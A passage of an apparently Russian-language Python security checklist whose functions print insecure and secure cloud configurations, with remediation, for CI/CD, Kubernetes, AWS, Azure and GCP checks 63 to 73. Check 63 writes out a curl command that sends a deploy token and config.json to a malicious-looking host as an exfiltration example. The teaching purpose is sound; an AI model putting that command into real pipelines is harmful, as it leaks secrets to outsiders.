    print("            key            = \"prod/terraform.tfstate\"")
    print("            region         = \"us-east-1\"")
    print("            encrypt        = true                    # ✅ Шифрование на стороне S3")
    print("            kms_key_id     = \"arn:aws:kms:...\"       # ✅ CMK для контроля ключа")
    print("            dynamodb_table = \"terraform-locks\"       # ✅ State locking")
    print("          }")
    print("        }")
    print("        # 02b_s3_bucket_secure.tf - Bucket без публичного доступа")
    print("        resource \"aws_s3_bucket_public_access_block\" \"terraform_state\" {")
    print("          bucket                  = aws_s3_bucket.terraform_state.id")
    print("          block_public_acls       = true")
    print("          block_public_policy     = true")
    print("          ignore_public_acls      = true")
    print("          restrict_public_buckets = true")
    print("        }")
    print("        # 03b_bucket_policy_secure.tf - Доступ только для доверенных ролей")
    print("        Principal = {")
    print("          AWS = [")
    print("            \"arn:aws:iam::123456789012:role/terraform-ci\",")
    print("            \"arn:aws:iam::123456789012:role/admin-users\"")
    print("          ]")
    print("        }")
    print("  🛠️ Remediation:")
    print("      • Включите шифрование state файла (encrypt = true)")
    print("      • Настройте state locking через DynamoDB")
    print("      • Заблокируйте публичный доступ к S3 bucket")
    print("      • Ограничьте доступ до конкретных IAM ролей")
    print()


# ═══════════════════════════════════════════════════════════════
# 🔹 РАЗДЕЛ 5: CI/CD & SUPPLY CHAIN CHECKS (63–65)
# ═══════════════════════════════════════════════════════════════

# ┌─────────────────────────────────────────────────────────────┐
# │ 🔹 Проверка 63: CI/CD Secret Exfiltration                  │
# ├─────────────────────────────────────────────────────────────┤
# │ 📋 Стандарт:   NIST-SI-10                                   │
# │ ⚡ Критичность: 🔴 CRITICAL                                  │
# │ 📝 Описание:   Pipeline может отправить секреты на внешний webhook │
# └─────────────────────────────────────────────────────────────┘
def check_ci_cd_secret_exfiltration_63():
    """Проверяет риск эксфильтрации секретов через CI/CD пайплайны."""
    print("⚠️  [CRITICAL] CI/CD Secret Exfiltration")
    print("  💥 Issue: Pipeline может отправить секреты на внешний webhook.")
    print("  🎯 Risk: Эксфильтрация секретов: токены, пароли, ключи отправляются на внешний сервер. Злоумышленник получает доступ к продакшену, базам данных, облачным аккаунтам.")
    print("  ❌ Insecure:")
    print("        # 01_pipeline.yaml - GitLab CI с потенциальной эксфильтрацией")
    print("        deploy:")
    print("          stage: deploy")
    print("          script:")
    print("          - echo \"Deploying with token $DEPLOY_TOKEN\"")
    print("          # ❌ Логирование секрета в консоль (попадает в логи CI)")
    print("          - curl -X POST https://external-logging.malicious.com/collect \\")
    print("              -H \"Authorization: $DEPLOY_TOKEN\" \\  # ❌ Отправка токена наружу!")
    print("              -d \"data=$(cat config.json)\"")
    print("        # 02_webhook_config.yaml - Webhook без валидации")
    print("        webhook:")
    print("          url: https://external-logging.malicious.com/collect  # ❌ Недоверенный домен")
    print("          headers:")
    print("            Authorization: $CI_JOB_TOKEN  # ❌ Токен передаётся наружу")
    print("  ✅ Secure:")
    print("        # 1. Никогда не логировать секреты:")
    print("        script:")
    print("        - echo \"Deploying...\"  # ✅ Без упоминания переменных с секретами")
    print("        - curl -X POST https://internal-monitoring.company.com/deploy \\")
    print("            -H \"Authorization: Bearer $INTERNAL_TOKEN\" \\  # ✅ Только доверенные домены")
    print("            -d \"status=success\"")
    print("        # 2. Валидация внешних endpoint'ов:")
    print("        #    - Использовать allowlist доменов в CI конфигурации")
    print("        #    - Проверять SSL сертификаты, использовать mTLS")
    print("        # 3. Маскирование секретов в логах:")
    print("        variables:")
    print("          DEPLOY_TOKEN:")
    print("            value: $DEPLOY_TOKEN")
    print("            masked: true      # ✅ Не показывать в логах")
    print("            protected: true   # ✅ Только для защищённых веток")
    print("  🛠️ Remediation:")
    print("      • Запретите логирование переменных с секретами")
    print("      • Используйте allowlist доменов для webhook")
    print("      • Включите masked: true для всех секретов")
    print("      • Аудируйте исходящие запросы из CI-раннеров")
    print()


# ┌─────────────────────────────────────────────────────────────┐
# │ 🔹 Проверка 64: Dependency Chain Vulnerability             │
# ├─────────────────────────────────────────────────────────────┤
# │ 📋 Стандарт:   NIST-SI-2                                    │
# │ ⚡ Критичность: 🟠 HIGH                                      │
# │ 📝 Описание:   Образ использует базовый образ с известными CVE │
# └─────────────────────────────────────────────────────────────┘
def check_dependency_chain_vulnerability_64():
    'Не считывает dockerfile пофикси'
    """Проверяет использование образов с известными уязвимостями в зависимостях."""
    print("⚠️  [HIGH] Dependency Chain Vulnerability")
    print("  💥 Issue: Образ использует базовый образ с известными CVE.")
    print("  🎯 Risk: Эксплуатация уязвимостей в зависимостях:\n"
          "    • RCE через уязвимость в базовом образе\n"
          "    • Утечка данных через уязвимость в библиотеке\n"
          "    • DoS, privilege escalation, supply-chain атаки\n"
          "  Сложность обнаружения: уязвимости 'наследуются' по цепочке.")
    print("  ❌ Insecure:")
    print("        # 02_base_image.yaml - Dockerfile с уязвимым базовым образом")
    print("        FROM python:3.8-slim  # ❌ Устаревший образ с известными CVE")
    print("        # CVE-2023-XXXX: уязвимость в openssl 1.1.1k")
    print("        # CVE-2024-YYYY: уязвимость в glibc")
    print("        RUN pip install flask==2.0.0  # ❌ Устаревшая версия с уязвимостями")
    print("        RUN apt-get update && apt-get install -y \\")
    print("          libssl1.1=1.1.1k-1  # ❌ Конкретная уязвимая версия")
    print("        # 03_cve_database.json - База CVE показывает:")
    print("        {")
    print("          \"python:3.8-slim\": {")
    print("            \"cves\": [")
    print("              { \"id\": \"CVE-2023-3817\", \"severity\": \"HIGH\", \"package\": \"openssl\"},")
    print("              { \"id\": \"CVE-2024-2961\", \"severity\": \"MEDIUM\", \"package\": \"glibc\"}")
    print("            ]")
    print("          }")
    print("        }")
    print("  ✅ Secure:")
    print("        # 1. Использовать актуальные, минимальные базовые образы:")
    print("        FROM python:3.12-slim-bookworm  # ✅ Актуальная версия")
    print("        # Или distroless для минимизации поверхности атаки:")
    print("        FROM gcr.io/distroless/python3-debian12")
    print("        # 2. Фиксировать версии и проверять уязвимости:")
    print("        # requirements.txt")
    print("        flask==3.0.0          # ✅ Актуальная версия")
    print("        gunicorn==21.2.0")
    print("        # 3. Сканирование образов в CI:")
    print("        # .gitlab-ci.yml")
    print("        scan-image:")
    print("          stage: test")
    print("          image: aquasec/trivy:latest")
    print("          script:")
    print("          - trivy image --exit-code 1 --severity CRITICAL,HIGH my-app:latest")
    print("          # ✅ Блокировать деплой при критических уязвимостях")
    print("  🛠️ Remediation:")
    print("      • Обновите базовые образы до актуальных версий")
    print("      • Используйте distroless/minimal images")
    print("      • Внедрите сканирование образов в CI/CD")
    print("      • Настройте Dependabot для автоматических обновлений")
    print()


# ┌─────────────────────────────────────────────────────────────┐
# │ 🔹 Проверка 65: Kubernetes Supply Chain Attack             │
# ├─────────────────────────────────────────────────────────────┤
# │ 📋 Стандарт:   SLSA-3                                       │
# │ ⚡ Критичность: 🔴 CRITICAL                                  │
# │ 📝 Описание:   В кластер можно деплоить неподписанные образы │
# └─────────────────────────────────────────────────────────────┘
def check_kubernetes_supply_chain_attack_65():
    """Проверяет возможность деплоя неподписанных/неверифицированных образов в кластер."""
    print("⚠️  [CRITICAL] Kubernetes Supply Chain Attack")
    print("  💥 Issue: В кластер можно деплоить неподписанные/неверифицированные образы.")
    print("  🎯 Risk: Supply-chain атака на кластер:\n"
          "    • Компрометация CI/CD = деплой вредоносного образа\n"
          "    • Подмена образа в реестре (man-in-the-middle)\n"
          "    • Использование уязвимостей в 'легальных' образах\n"
          "  Без проверки подписей невозможно гарантировать целостность.")
    print("  ❌ Insecure:")
    print("        # 01_image_deployment.yaml - Деплой без проверки подписи")
    print("        apiVersion: apps/v1")
    print("        kind: Deployment")
    print("        metadata:")
    print("          name: vulnerable-app")
    print("        spec:")
    print("          template:")
    print("            spec:")
    print("              containers:")
    print("              - name: app")
    print("                image: registry.company.com/app:v1.2.3")
    print("                # ❌ Нет проверки: кто подписал образ? не модифицирован ли он?")
    print("        # 02_admission_policy.yaml - Отсутствует ValidatingAdmissionPolicy")
    print("        # или политика не проверяет подписи:")
    print("        validations:")
    print("          expression: \"object.spec.template.spec.containers.all(c, c.image.startsWith('registry.company.com/'))\"")
    print("          # ❌ Проверяет только реестр, но не подпись/целостность образа")
    print("        # 03_signature_verification.yaml - Cosign verification не настроен")
    print("  ✅ Secure:")
    print("        # 1. Включить проверку подписей через Sigstore/Cosign:")
    print("        # ClusterImagePolicy (Sigstore policy-controller)")
    print("        apiVersion: policy.sigstore.dev/v1beta1")
    print("        kind: ClusterImagePolicy")
    print("        metadata:")
    print("          name: signed-images-only")
    print("        spec:")
    print("          images:")
    print("            glob: \"registry.company.com/**\"")
    print("          authorities:")
    print("          - key:")
    print("              data: |")
    print("                -----BEGIN PUBLIC KEY-----")
    print("                MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE...")
    print("                -----END PUBLIC KEY-----")
    print("        # 2. Admission webhook для валидации:")
    print("        #    - Установить policy-controller от Sigstore")
    print("        #    - Настроить failurePolicy: Fail")
    print("        # 3. Подпись образов в CI:")
    print("        #    - cosign sign --key $COSIGN_PRIVATE_KEY registry.company.com/app:$CI_COMMIT_SHA")
    print("  🛠️ Remediation:")
    print("      • Внедрите Sigstore/Cosign для подписи образов")
    print("      • Настройте ValidatingAdmissionPolicy для проверки подписей")
    print("      • Подписывайте все образы в CI/CD пайплайне")
    print("      • Требуйте SBOM для каждого образа")
    print()


# ═══════════════════════════════════════════════════════════════
# 🔹 РАЗДЕЛ 6: CLOUD GOVERNANCE CHECKS (66–68)
# ═══════════════════════════════════════════════════════════════

# ┌─────────────────────────────────────────────────────────────┐
# │ 🔹 Проверка 66: Cloud Resource Tagging Compliance          │
# ├─────────────────────────────────────────────────────────────┤
# │ 📋 Стандарт:   NIST-CM-2.1                                  │
# │ ⚡ Критичность: 🟡 MEDIUM                                    │
# │ 📝 Описание:   Ресурсы созданы без обязательных тегов      │
# └─────────────────────────────────────────────────────────────┘
def check_cloud_resource_tagging_compliance_66():
    """Проверяет наличие обязательных тегов на облачных ресурсах."""
    print("⚠️  [MEDIUM] Cloud Resource Tagging Compliance")
    print("  💥 Issue: Ресурсы созданы без обязательных тегов (owner, cost-center, env).")
    print("  🎯 Risk: Отсутствие тегов = потеря контроля над инфраструктурой:\n"
          "    • Невозможно определить владельца для инцидента\n"
          "    • Сложность распределения затрат (cost allocation)\n"
          "    • Нарушение требований комплаенса (SOC2, ISO27001)\n"
          "    • Риск 'забытых' ресурсов (orphaned resources)")
    print("  ❌ Insecure:")
    print("        # 01_resources.yaml - Ресурсы без обязательных тегов")
    print("        Type: AWS::EC2::Instance")
    print("        Properties:")
    print("          InstanceType: t3.medium")
    print("          ImageId: ami-12345678")
    print("          # Tags отсутствуют или неполные:")
    print("          Tags:")
    print("          - Key: Name")
    print("            Value: web-server")
    print("          # ❌ Нет: owner, cost-center, environment")
    print("        Type: AWS::S3::Bucket")
    print("        Properties:")
    print("          BucketName: company-data-bucket")
    print("          # ❌ Tags полностью отсутствуют")
    print("        # 02_tagging_policy.yaml - Политика требует теги:")
    print("        RequiredTags:")
    print("        - owner")
    print("        - cost-center")
    print("        - environment")
    print("        - project")
    print("        # Но ресурсы не соответствуют политике")
    print("  ✅ Secure:")
    print("        # 1. Обязательные теги на всех ресурсах:")
    print("        Type: AWS::EC2::Instance")
    print("        Properties:")
    print("          InstanceType: t3.medium")
    print("          Tags:")
    print("          - Key: Name")
    print("            Value: web-server")
    print("          - Key: owner")
    print("            Value: team-platform@company.com")
    print("          - Key: cost-center")
    print("            Value: CC-12345")
    print("          - Key: environment")
    print("            Value: production")
    print("          - Key: project")
    print("            Value: main-app")
    print("        # 2. Принудительное применение через AWS Config:")
    print("        Type: AWS::Config::ConfigRule")
    print("        Properties:")
    print("          ConfigRuleName: required-tags")
    print("          Source:")
    print("            Owner: AWS")
    print("            SourceIdentifier: REQUIRED_TAGS")
    print("        # 3. Tag Policy через AWS Organizations")
    print("  🛠️ Remediation:")
    print("      • Добавьте обязательные теги ко всем ресурсам")
    print("      • Включите AWS Config rule для мониторинга")
    print("      • Используйте Tag Policy через Organizations")
    print("      • Настройте pre-commit hooks для валидации")
    print()


# ┌─────────────────────────────────────────────────────────────┐
# │ 🔹 Проверка 67: Encryption Key Cross-Account Access        │
# ├─────────────────────────────────────────────────────────────┤
# │ 📋 Стандарт:   CIS-AWS-2.1.6                                │
# │ ⚡ Критичность: 🟠 HIGH                                      │
# │ 📝 Описание:   KMS ключ доступен другому аккаунту без условий │
# └─────────────────────────────────────────────────────────────┘
def check_encryption_key_cross_account_access_67():
    """Проверяет кросс-аккаунт доступ к KMS ключам без условий безопасности."""
    print("⚠️  [HIGH] Encryption Key Cross-Account Access")
    print("  💥 Issue: KMS ключ доступен другому AWS аккаунту без условий безопасности.")
    print("  🎯 Risk: Кросс-аккаунт доступ без ограничений:\n"
          "    • Любой пользователь из аккаунта 222222222222 может расшифровывать данные\n"
          "    • При компрометации второго аккаунта = утечка данных\n"
          "    • Невозможно отследить, кто именно использовал ключ\n"
          "    • Нарушение принципа наименьших привилегий")
    print("  ❌ Insecure:")
    print("        # 01_kms_key.yaml - KMS ключ с кросс-аккаунт доступом")
    print("        Type: AWS::KMS::Key")
    print("        Properties:")
    print("          KeyPolicy:")
    print("            Statement:")
    print("            - Sid: Enable IAM User Permissions")
    print("              Effect: Allow")
    print("              Principal:")
    print("                AWS: \"arn:aws:iam::111111111111:root\"")
    print("              Action: \"kms:*\"")
    print("            - Sid: Allow Cross-Account Access")
    print("              Effect: Allow")
    print("              Principal:")
    print("                AWS: \"arn:aws:iam::222222222222:root\"  # ❌ Другой аккаунт!")
    print("              Action:")
    print("              - \"kms:Decrypt\"")
    print("              - \"kms:Encrypt\"")
    print("              - \"kms:GenerateDataKey\"")
    print("              Resource: \"*\"")
    print("              # ❌ Нет Condition для ограничения!")
    print("  ✅ Secure:")
    print("        # 1. Ограничить доступ конкретными ролями, не root аккаунта:")
    print("        Statement:")
    print("          Sid: Allow Cross-Account Access")
    print("          Effect: Allow")
    print("          Principal:")
    print("            AWS: \"arn:aws:iam::222222222222:role/TrustedAppRole\"  # ✅ Конкретная роль")
    print("          Action:")
    print("          - \"kms:Decrypt\"")
    print("          - \"kms:GenerateDataKey\"")
    print("          Resource: \"*\"")
    print("        # 2. Добавить условия для дополнительной защиты:")
    print("        Condition:")
    print("          StringEquals:")
    print("            \"kms:ViaService\": \"s3.us-east-1.amazonaws.com\"  # ✅ Только через S3")
    print("          Bool:")
    print("            \"aws:SecureTransport\": \"true\"  # ✅ Только HTTPS")
    print("        # 3. Включить логирование использования ключа через CloudTrail")
    print("  🛠️ Remediation:")
    print("      • Замените root аккаунта на конкретные IAM роли")
    print("      • Добавьте Condition для ограничения использования")
    print("      • Включите CloudTrail для KMS событий")
    print("      • Регулярно аудируйте кросс-аккаунт доступы")
    print()


# ┌─────────────────────────────────────────────────────────────┐
# │ 🔹 Проверка 68: VPC Peering Security Gap                   │
# ├─────────────────────────────────────────────────────────────┤
# │ 📋 Стандарт:   CIS-AWS-5.7                                  │
# │ ⚡ Критичность: 🟠 HIGH                                      │
# │ 📝 Описание:   VPC peering + route table + SG позволяют доступ из dev к prod │
# └─────────────────────────────────────────────────────────────┘
def check_vpc_peering_security_gap_68():
    """Проверяет безопасность конфигурации VPC peering между окружениями."""
    print("⚠️  [HIGH] VPC Peering Security Gap")
    print("  💥 Issue: VPC peering + route table + security group позволяют доступ из dev к prod.")
    print("  🎯 Risk: VPC Peering security gap:\n"
          "    • Разработчики из dev VPC могут подключиться к prod БД\n"
          "    • Горизонтальное перемещение между окружениями\n"
          "    • Утечка производственных данных в dev среду\n"
          "    • Нарушение сегментации production/isolation")
    print("  ❌ Insecure:")
    print("        # 01_vpc_a.yaml - Production VPC (10.0.0.0/16)")
    print("        # 02_vpc_b.yaml - Development VPC (10.1.0.0/16)")
    print("        # 03_peering_connection.yaml - Peering между prod и dev")
    print("        # 04_route_tables.yaml - Маршруты разрешают весь трафик")
    print("        Routes:")
    print("          DestinationCidrBlock: 10.1.0.0/16  # ✅ Весь dev VPC")
    print("          VpcPeeringConnectionId: !Ref Peering")
    print("        # Security Group в prod разрешает доступ из dev:")
    print("        SecurityGroupIngress:")
    print("          IpProtocol: tcp")
    print("          FromPort: 5432")
    print("          ToPort: 5432")
    print("          CidrIp: 10.1.0.0/16  # ❌ Весь dev VPC имеет доступ к prod DB!")
    print("  ✅ Secure:")
    print("        # 1. Ограничить маршруты конкретными подсетями:")
    print("        Routes:")
    print("          DestinationCidrBlock: 10.1.1.0/24  # ✅ Только конкретная подсеть dev")
    print("          VpcPeeringConnectionId: !Ref Peering")
    print("        # 2. Security Group с минимальными правами:")
    print("        SecurityGroupIngress:")
    print("          IpProtocol: tcp")
    print("          FromPort: 5432")
    print("          ToPort: 5432")
    print("          SourceSecurityGroupId: !Ref DevAppSecurityGroup  # ✅ Только конкретный SG")
    print("          # ❌ Не использовать CidrIp для peering!")
    print("        # 3. Network ACL для дополнительного контроля:")
    print("        RuleNumber: 100")
    print("          CidrBlock: 10.1.1.0/24  # ✅ Только разрешённая подсеть")
    print("          RuleAction: allow")
    print("        RuleNumber: 200")
    print("          CidrBlock: 0.0.0.0/0")
    print("          RuleAction: deny  # ✅ Deny by default")
    print("  🛠️ Remediation:")
    print("      • Ограничьте route tables до конкретных подсетей")
    print("      • Используйте SourceSecurityGroupId вместо CidrIp")
    print("      • Настройте Network ACL для дополнительного контроля")
    print("      • Используйте Transit Gateway с инспекцией трафика")
    print()


# ═══════════════════════════════════════════════════════════════
# 🔹 РАЗДЕЛ 7: IDENTITY & ACCESS CHECKS (69–70)
# ═══════════════════════════════════════════════════════════════

# ┌─────────────────────────────────────────────────────────────┐
# │ 🔹 Проверка 69: Azure AAD Privileged Identity              │
# ├─────────────────────────────────────────────────────────────┤
# │ 📋 Стандарт:   CIS-Azure-1.1                                │
# │ ⚡ Критичность: 🔴 CRITICAL                                  │
# │ 📝 Описание:   Привилегированные роли Azure AD без PIM контроля │
# └─────────────────────────────────────────────────────────────┘
def check_azure_aad_privileged_identity_69():
    """Проверяет контроль активации привилегированных ролей Azure AD через PIM."""
    print("⚠️  [CRITICAL] Azure AAD Privileged Identity")
    print("  💥 Issue: Привилегированные роли Azure AD назначены без PIM контроля активации.")
    print("  🎯 Risk: Privileged Identity без контроля:\n"
          "    • Постоянный доступ = большая поверхность атаки\n"
          "    • Компрометация учётки = полный доступ к tenant\n"
          "    • Отсутствие аудита активаций привилегий\n"
          "    • Нарушение принципа Just-In-Time доступа")
    print("  ❌ Insecure:")
    print("        # 01_azure_user.yaml - Пользователь с постоянной привилегированной ролью")
    print("        Type: Microsoft.Authorization/roleAssignments")
    print("        Properties:")
    print("          principalId: \"user-id-12345\"")
    print("          roleDefinitionId: \"Global Administrator\"  # ❌ Highest privilege!")
    print("          # Роль назначена постоянно, не через PIM")
    print("        # 02_pim_policy.yaml - PIM настройки без approval")
    print("        {")
    print("          \"roleSettings\": {")
    print("            \"requireApproval\": false,  # ❌ Не требуется одобрение")
    print("            \"maxActivationDuration\": \"PT8H\",")
    print("            \"requireMfa\": false,  # ❌ MFA не требуется")
    print("            \"requireJustification\": false  # ❌ Не требуется обоснование")
    print("          }")
    print("        }")
    print("  ✅ Secure:")
    print("        # 1. Использовать PIM для всех привилегированных ролей:")
    print("        {")
    print("          \"roleSettings\": {")
    print("            \"requireApproval\": true,  # ✅ Требуется одобрение")
    print("            \"approvers\": [")
    print("              \"admin1@company.com\",")
    print("              \"admin2@company.com\"")
    print("            ],")
    print("            \"maxActivationDuration\": \"PT4H\",  # ✅ Максимум 4 часа")
    print("            \"requireMfa\": true,  # ✅ MFA обязательно")
    print("            \"requireJustification\": true,  # ✅ Требуется обоснование")
    print("            \"requireTicketInfo\": true  # ✅ Ссылка на тикет")
    print("          }")
    print("        }")
    print("        # 2. Назначить роль как \"Eligible\", не \"Active\":")
    print("        condition: \"PIM\"  # ✅ Только через PIM")
    print("        # 3. Включить аудит и алерты на активацию критических ролей")
    print("  🛠️ Remediation:")
    print("      • Включите PIM для всех привилегированных ролей")
    print("      • Требуйте MFA и approval для активации")
    print("      • Ограничьте длительность сессии до 4 часов")
    print("      • Настройте аудит активаций привилегий")
    print()


# ┌─────────────────────────────────────────────────────────────┐
# │ 🔹 Проверка 70: GCP Service Account Key Leakage            │
# ├─────────────────────────────────────────────────────────────┤
# │ 📋 Стандарт:   CIS-GCP-1.1.5                                │
# │ ⚡ Критичность: 🔴 CRITICAL                                  │
# │ 📝 Описание:   Ключи сервисных аккаунтов GCP не ротируются │
# └─────────────────────────────────────────────────────────────┘
def check_gcp_service_account_key_leakage_70():
    """Проверяет ротацию и безопасность ключей сервисных аккаунтов GCP."""
    print("⚠️  [CRITICAL] GCP Service Account Key Leakage")
    print("  💥 Issue: Ключи сервисных аккаунтов GCP не ротируются или могут быть в repo.")
    print("  🎯 Risk: Service Account Key leakage:\n"
          "    • Ключи в git = публичная утечка (GitHub сканирование)\n"
          "    • Долгая жизнь ключа = больший ущерб при компрометации\n"
          "    • Сложность отзыва: нужно найти все места использования\n"
          "    • Нарушение compliance требований")
    print("  ❌ Insecure:")
    print("        # 01_service_account.yaml - Сервисный аккаунт")
    print("        Type: google_service_account")
    print("        Properties:")
    print("          account_id: \"app-service-account\"")
    print("          # Ключи управляются вручную")
    print("        # 02_sa_key.yaml - Ключ без ротации")
    print("        Type: google_service_account_key")
    print("        Properties:")
    print("          service_account_id: google_service_account.app.id")
    print("          public_key_type: \"TYPE_X509_PEM_FILE\"")
    print("          # ❌ Нет политики ротации")
    print("          # ❌ Ключ может храниться годами")
    print("          # ❌ Может быть закоммичен в git")
    print("        # 03_key_rotation_policy.yaml - Отсутствует или не enforced")
    print("        {")
    print("          \"keyRotationPolicy\": {")
    print("            \"enabled\": false,  # ❌ Ротация отключена")
    print("            \"maxKeyLifetime\": null  # ❌ Нет ограничения времени жизни")
    print("          }")
    print("        }")
    print("  ✅ Secure:")
    print("        # 1. Использовать Workload Identity вместо ключей:")
    print("        # Для GKE:")
    print("        apiVersion: v1")
    print("        kind: ServiceAccount")
    print("        metadata:")
    print("          annotations:")
    print("            iam.gke.io/gcp-service-account: app-sa@project.iam.gserviceaccount.com")
    print("          # ✅ Без ключей, аутентификация через metadata server")
    print("        # 2. Если ключи необходимы - автоматическая ротация:")
    print("        {")
    print("          \"keyRotationPolicy\": {")
    print("            \"enabled\": true,  # ✅ Включена")
    print("            \"maxKeyLifetime\": \"7776000s\",  # ✅ 90 дней")
    print("            \"rotationPeriod\": \"2592000s\"  # ✅ Ротация каждые 30 дней")
    print("          }")
    print("        }")
    print("        # 3. Хранение ключей в Secret Manager")
    print("        # 4. Мониторинг и алерты на создание ключей")
    print("  🛠️ Remediation:")
    print("      • Используйте Workload Identity вместо ключей")
    print("      • Включите автоматическую ротацию ключей")
    print("      • Храните ключи в Secret Manager")
    print("      • Сканируйте git repos на паттерны ключей")
    print()


# ═══════════════════════════════════════════════════════════════
# 🔹 РАЗДЕЛ 8: ADVANCED KUBERNETES CHECKS (71–72)
# ═══════════════════════════════════════════════════════════════

# ┌─────────────────────────────────────────────────────────────┐
# │ 🔹 Проверка 71: Kubernetes Audit Log Tampering             │
# ├─────────────────────────────────────────────────────────────┤
# │ 📋 Стандарт:   CIS-K8S-3.2.1                                │
# │ ⚡ Критичность: 🟠 HIGH                                      │
# │ 📝 Описание:   Путь к audit log доступен для записи контейнерами │
# └─────────────────────────────────────────────────────────────┘
def check_kubernetes_audit_log_tampering_71():
    """Проверяет защиту audit логов Kubernetes от модификации."""
    print("⚠️  [HIGH] Kubernetes Audit Log Tampering")
    print("  💥 Issue: Путь к audit log доступен для записи контейнерами на хосте.")
    print("  🎯 Risk: Audit log tampering:\n"
          "    • Злоумышленник удаляет логи после атаки\n"
          "    • Невозможно расследовать инцидент\n"
          "    • Нарушение требований аудита (SOC2, PCI-DSS)\n"
          "    • Скрытие несанкционированных действий")
    print("  ❌ Insecure:")
    print("        # 01_apiserver_config.yaml - Конфигурация API Server")
    print("        apiVersion: v1")
    print("        kind: Pod")
    print("        metadata:")
    print("          name: kube-apiserver")
    print("          namespace: kube-system")
    print("        spec:")
    print("          containers:")
    print("          - name: kube-apiserver")
    print("            command:")
    print("            - kube-apiserver")
    print("            - --audit-log-path=/var/log/kubernetes/audit.log")
    print("            volumeMounts:")
    print("            - name: audit-logs")
    print("              mountPath: /var/log/kubernetes")
    print("        # 02_host_volume.yaml - Volume с опасными permissions")
    print("        volumes:")
    print("        - name: audit-logs")
    print("          hostPath:")
    print("            path: /var/log/kubernetes")
    print("            type: DirectoryOrCreate")
    print("          # ❌ На хосте директория имеет permissions 777")
    print("          # ❌ Любой под может записать/удалить логи")
    print("          # ❌ Нет отдельного пользователя для логов")
    print("  ✅ Secure:")
    print("        # 1. Защитить путь к логам на уровне хоста:")
    print("        #    /var/log/kubernetes должен принадлежать root:root")
    print("        #    Permissions: 750 или строже")
    print("        #    chown root:root /var/log/kubernetes")
    print("        #    chmod 750 /var/log/kubernetes")
    print("        # 2. Использовать отдельный volume для логов:")
    print("        volumes:")
    print("        - name: audit-logs")
    print("          hostPath:")
    print("            path: /var/log/kubernetes/audit")
    print("            type: DirectoryOrCreate")
    print("        # Смонтировать как read-only для всех кроме API server:")
    print("        volumeMounts:")
    print("        - name: audit-logs")
    print("          mountPath: /var/log/kubernetes")
    print("          readOnly: false  # Только для API server")
    print("        # 3. Отправить логи в удалённое хранилище (SIEM)")
    print("        # 4. Pod Security Policy / Admission Controller для запрета hostPath")
    print("  🛠️ Remediation:")
    print("      • Ограничьте permissions на хосте для audit-директорий")
    print("      • Отправьте логи в удалённое SIEM хранилище")
    print("      • Запретите монтирование hostPath через admission controller")
    print("      • Включите integrity monitoring для audit.log")
    print()


# ┌─────────────────────────────────────────────────────────────┐
# │ 🔹 Проверка 72: Container Registry Public Push             │
# ├─────────────────────────────────────────────────────────────┤
# │ 📋 Стандарт:   CIS-Docker-4.3                               │
# │ ⚡ Критичность: 🔴 CRITICAL                                  │
# │ 📝 Описание:   Registry позволяет загружать образы без аутентификации │
# └─────────────────────────────────────────────────────────────┘
def check_container_registry_public_push_72():
    """Проверяет политики доступа к container registry для push операций."""
    print("⚠️  [CRITICAL] Container Registry Public Push")
    print("  💥 Issue: Registry позволяет загружать образы без аутентификации.")
    print("  🎯 Risk: Public push к registry:\n"
          "    • Злоумышленник загружает вредоносный образ\n"
          "    • Подмена легитимных образов (tag hijacking)\n"
          "    • Supply chain атака на все деплои\n"
          "    • Запуск малвари в production")
    print("  ❌ Insecure:")
    print("        # 01_registry_config.yaml - Конфигурация Registry")
    print("        Type: Registry")
    print("        Properties:")
    print("          host: registry.company.com")
    print("          port: 5000")
    print("          authentication:")
    print("            enabled: false  # ❌ Аутентификация отключена!")
    print("          authorization:")
    print("            anonymous_push: true  # ❌ Анонимный push разрешён!")
    print("        # 02_access_policy.yaml - Политика доступа")
    print("        {")
    print("          \"repositories\": {")
    print("            \"*\": {")
    print("              \"pull\": \"anonymous\",  # ✅ OK для публичных образов")
    print("              \"push\": \"anonymous\"   # ❌ Опасно! Любой может запушить")
    print("            }")
    print("          }")
    print("        }")
    print("  ✅ Secure:")
    print("        # 1. Требовать аутентификацию для всех операций:")
    print("        authentication:")
    print("          enabled: true")
    print("          type: htpasswd  # или token, oauth2")
    print("          # Для production использовать OIDC/SSO")
    print("        authorization:")
    print("          anonymous_push: false  # ✅ Запретить анонимный push")
    print("          anonymous_pull: false  # ✅ Или ограничить публичные репозитории")
    print("        # 2. Role-based access control:")
    print("        {")
    print("          \"repositories\": {")
    print("            \"production/\": {")
    print("              \"pull\": \"service-account\",")
    print("              \"push\": \"ci-cd-pipeline\"  # ✅ Только CI/CD")
    print("            }")
    print("          }")
    print("        }")
    print("        # 3. Подпись образов (cosign/notary)")
    print("        # 4. Сканирование образов перед accept")
    print("  🛠️ Remediation:")
    print("      • Включите аутентификацию для всех операций")
    print("      • Запретите anonymous_push")
    print("      • Внедрите RBAC для registry")
    print("      • Требуйте подпись образов перед accept")
    print()


# ═══════════════════════════════════════════════════════════════
# 🔹 РАЗДЕЛ 9: SERVERLESS & MULTI-CLOUD CHECKS (73–75)
# ═══════════════════════════════════════════════════════════════

# ┌─────────────────────────────────────────────────────────────┐
# │ 🔹 Проверка 73: Serverless Function Chain Exploit          │
# ├─────────────────────────────────────────────────────────────┤
# │ 📋 Стандарт:   NIST-AC-4                                    │
# │ ⚡ Критичность: 🔴 CRITICAL                                  │
# │ 📝 Описание:   Цепочка serverless ресурсов позволяет эскалацию │
# └─────────────────────────────────────────────────────────────┘
def check_serverless_function_chain_exploit_73():
    """Проверяет цепочки serverless ресурсов на риск эскалации привилегий."""
    print("⚠️  [CRITICAL] Serverless Function Chain Exploit")
    print("  💥 Issue: Цепочка serverless ресурсов позволяет эскалацию привилегий (API → Lambda → DB → SNS).")
    print("  🎯 Risk: Serverless chain exploit:\n"
          "    • Один уязвимый endpoint = доступ ко всей цепочке\n"
          "    • Чтение всех данных из DynamoDB\n"
          "    • Рассылка фишинга через SNS\n"
          "    • Эскалация через Lambda к другим сервисам")
    print("  ❌ Insecure:")
    print("        # 01_api_gateway.yaml - Публичный API Gateway")
    print("        Type: AWS::ApiGateway::RestApi")
    print("        Properties:")
    print("          Name: public-api")
    print("          # ❌ Нет авторизации на уровне API")
    print("        # 02_lambda_function.yaml - Lambda с избыточными правами")
    print("        Type: AWS::Lambda::Function")
    print("        Properties:")
    print("          FunctionName: process-data")
    print("          Role: arn:aws:iam::123456789012:role/Lambda-Role")
    print("        # Lambda-Role policy:")
    print("        Effect: Allow")
    print("        Action:")
    print("        - \"dynamodb:*\"  # ❌ Все действия над DynamoDB")
